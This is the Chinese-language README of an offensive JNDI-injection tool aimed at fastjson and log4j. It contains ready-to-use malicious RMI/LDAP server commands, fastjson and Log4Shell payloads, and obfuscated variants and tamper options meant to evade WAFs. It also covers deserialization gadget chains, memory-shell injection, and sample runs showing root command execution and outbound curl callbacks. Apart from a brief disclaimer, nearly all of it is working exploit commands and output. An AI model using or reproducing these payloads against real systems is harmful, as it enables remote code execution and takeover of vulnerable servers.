# jndi_tool

```
声明： 此工具仅用于企业安全人员自查验证自身企业资产的安全风险，或有合法授权的安全测试，请勿用于其他用途，如有，后果自负。

download_url : https://toolaffix.oss-cn-beijing.aliyuncs.com/jndi_tool.jar

> java -jar jndi_tool.jar 
Usage:
jndi:
java -cp jndi_tool.jar jndi.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
java -cp jndi_tool.jar jndi.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"

java -cp jndi_tool.jar jndi.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" el-win/el-linux/groovy
java -cp jndi_tool.jar jndi.LDAPRefServer 1099 

java -cp jndi_tool.jar jndi.HLDAPServer2 127.0.0.1 80 "whoami"  

fastjson:
java -cp jndi_tool.jar jndi.fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename tamper=tohex chunk=on
java -cp jndi_tool.jar jndi.fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
java -cp jndi_tool.jar jndi.fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/Object\",\"autoCommit\":true}}" 

log4j:
java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j 127.0.0.1 80 "whoami" http://target  w=tomcat/groory/http  default:http
java -cp jndi_tool.jar jndi.log4j.HLDAPLog4jAuto 127.0.0.1 1099 url=http://xxx
java -cp jndi_tool.jar jndi.log4j.Tamper "${jndi:ldap://127.0.0.1/a}" all=true random=true


# 2021-12-18 优化了细节

1. 新增LOG4J相关检测
> java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 80 "whoami" http://xx.xx.xx:8080/
[-] payload:  ${jndi:ldap://xx.xx.xx.xx/x}
[-] LDAP Listening on 0.0.0.0:80
[-] remote target jdk version: java/1.8.0_131, use payload version: jdk8
[-] send payload done
[-] waiting result...
result: 
root

> java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 80 "whoami" http://xx.xx.xx:8080/ w=tomcat  // 高版本jdk的绕过，依赖el
[-] payload:  ${jndi:ldap://xx.xx.xx.xx/x}
[-] LDAP Listening on 0.0.0.0:80
[-] start exploit.
[-] input class: tomcat, command: curl xx.xx.xx
[*] Send data...
[-] exit.


> java -cp jndi_tool.jar jndi.log4j.Tamper "\${jndi:ldap://127.0.0.1/a}"  random=true
[-] process all string is: False
[-] random process string is: True
--------------------------------------------------
${jndi:ldap://127.0.0.1/a}
${j${upper:n}d${upper:i}:l${upper:d}${upper:a}p://127.0.0.1/a}
${j${upper:n}d${upper:${upper:i}}:l${upper:d}${upper:a}p://127.0.0.1/a}
${j${lower:n}d${lower:i}:l${lower:d}${lower:a}p://127.0.0.1/a}
${j${::-n}d${::-i}:l${::-d}${::-a}p://127.0.0.1/a}
${j${Omhc:qBz:-n}d${b:Hz:-i}:l${vX::-d}${puF:A:-a}p://127.0.0.1/a}
${j${Ez:mk:cHK:Xwn::-n}d${TXjk:LN:vBjQ::-i}:l${Nz:Of:bfDt:AgIH:-d}${TDN:SchK:uWu::-a}p://127.0.0.1/a}
${j${lower:${lower:n}}d${lower:${lower:${lower:${lower:i}}}}:l${lower:${lower:${lower:d}}}${lower:${lower:${lower:${lower:a}}}}p://127.0.0.1/a}
${j${upper:${upper:${upper:n}}}d${upper:${upper:${upper:${upper:i}}}}:l${upper:${upper:d}}${upper:${upper:a}}p://127.0.0.1/a}
${j${lower:${lower:${lower:${lower:n}}}}d${upper:${lower:${upper:i}}}:l${lower:d}${upper:${upper:${lower:a}}}p://127.0.0.1/a}


2. 优化 jndi.LDAPRefServer，支持gadget/command形式，例如 ldap://xx.xx.xx.xx:1099/CommonsCollections1/curl x.com"
具体执行 java -cp jndi_tool.jar jndi.LDAPRefServer 1099查看





2021-09-23日志：
1. fastjson.LDAPRefServerAuto 新增内存shell , chunk编码:可以绕一些简单的防护检测策略，结合tamper，可以绕更多的防护检测
2. fastjson.EvilRMIServer     错误修复
3. 新增一些反序列利用链


2021-03-31 新增：
1.fastjson.Tamper : fastjson的一些特性，可以绕一些WAF
[-] tamper list: 
tohex 
tounicode 
tohexunicode 
tourlencode 
randomhex 
randomunicode 
addis 
addcomment 
addmorecomment 
addcommas      
addrandomx 
add- 
add_ 
addsize       填充内容

tamper支持多个，但有些不能一起用，多个注意使用的先后顺序，例如 tohex,addcomment

2.jndi.fastjson.LDAPRefServerAuto : 新增了一些场景的回显, 选择payload的地方增加了自定义，格式: payload={.........}




2020-10-30 新增：
jndi.fastjson.LDAPRefServerAuto: 自动找寻反序列可利用的gadget(cb1,cc1-10,spring1-2,groovy1,jdk7u21)。
java -cp jndi_tool.jar jndi.fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename

filename为请求包，需要插入fastjson攻击语句的地方，用__PAYLOAD__代替。示例：
POST /fastjson_demo HTTP/1.1
Host: xx.xx.xx.xx
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.16 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/json
Content-Length: 165

__PAYLOAD__


> java -cp jndi_tool.jar jndi.fastjson.LDAPRefServerAuto 127.0.0.1 8088 file=req chunk=on
[-] Chunked coding ON
[-] target: https://xx.xx.xx.xx/fastjson_demo
[-] Payload list:
0. {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}
1. {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
[-] [-] please chosse payload, or input payload like payload={......}  chunk=on / chunk=off
> 1
[-] url: https://xx.xx.xx.xx/fastjson_demo
[-] post_data: {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
[-] LDAP Listening on 127.0.0.1:8088
[-] checking CommonsBeanutils1
[*] find: CommonsBeanutils1 can be use
[*] CHECK ECHO.
[-] ECHO FIND.
[-] please enter command, enter q or quit to quit, tomcatshell or springshell get memshell, chunk=on / chunk=off
> id
uid=0(root) gid=0(root) groups=0(root)

[-] please enter command, enter q or quit to quit, tomcatshell or springshell get memshell, chunk=on / chunk=off
> q
[-] quit



[root@ /]# java -cp jndi_tool.jar jndi.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
[-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}
[-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}}
[-] Opening JRMP listener on 80
[-] Have connection from /xx.xx.xx.xx:33543
[-] Reading message...
[-] Is RMI.lookup call for Exploit 2
[-] Sending remote classloading stub targeting http://xx.xx.xx.xx:80/Object.class
[-] Closing connection
[*] Have connection from /xx.xx.xx.xx:33544 /Object.class
[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
[-] send payload done and exit.


[root@ /]# java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
[-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}
[-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}}
[-] LDAP Listening on 0.0.0.0:80
[*] Send LDAP reference result for Exploit redirecting to http://xx.xx.xx.xx:80/Object.class
[*] Have connection from /xx.xx.xx.xx:33548 /Object.class
[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
[-] send payload done and exit.

===================================================================================================

if command need base64 encode, command should startwith bash=/powershell=/python=/perl=
example:  bash=curl dnslog.wyzxxz.cn



1. RMI (need tomcat8)
java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"


2. RMI/LDAP + HTTP
java -cp jndi_tool.jar jndi.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
/
java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"


3. LDAP2
java -cp fastjson_tool.jar jndi.fastjson.LDAPRefServer 1099
CommonsBeanutils1  
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
CommonsCollections8
CommonsCollections9
CommonsCollections10                                                                                                                                                          
CommonsCollectionsK1                                                                                                                                                             
CommonsCollectionsK2                                                                                                                                                             
CommonsCollectionsK3                                                                                                                                                             
CommonsCollectionsK4
Groovy1            
URLDNS             
JSON1              
Spring1            
Spring2            
file   （BASE64编码后的反序列内容文件）


```


```

rmi:
1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}

3. 查看日志是否curl成功

===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}


3. 查看日志是否执行成功


===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp jndi_tool.jar jndi.LDAPRefServer 1099

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:1099/CommonsCollections1/curl x.com","autoCommit":true}


3. 查看日志是否执行成功






```

